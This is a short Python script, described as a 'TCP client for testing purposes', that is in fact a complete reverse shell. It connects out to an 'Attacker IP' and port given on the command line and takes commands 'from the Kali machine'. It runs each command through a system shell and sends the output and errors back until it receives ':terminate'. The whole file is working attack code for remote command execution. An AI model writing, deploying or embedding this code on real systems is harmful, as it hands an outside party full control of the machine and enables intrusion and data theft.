#!/usr/bin/env python3
"""
TCP Client Instance for testing purposes
"""

import socket, subprocess, sys
address = sys.argv[1]
port = sys.argv[2]


def connect():
    global address,port
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # start a socket object 's'
    s.connect((address, int(port))) # Here we define the Attacker IP and the listening port
    while True: # keep receiving commands from the Kali machine
        command = s.recv(1024) # read the first KB of the tcp socket
        if command.decode('utf8').startswith(':terminate'):
            s.close()
            break;
        CMD = subprocess.Popen(command.decode('utf8'), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,  stdin=subprocess.PIPE)
        s.send( CMD.stdout.read() ) # send back the result
        s.send( CMD.stderr.read() ) # send back the error -if any-, such as syntax error


connect()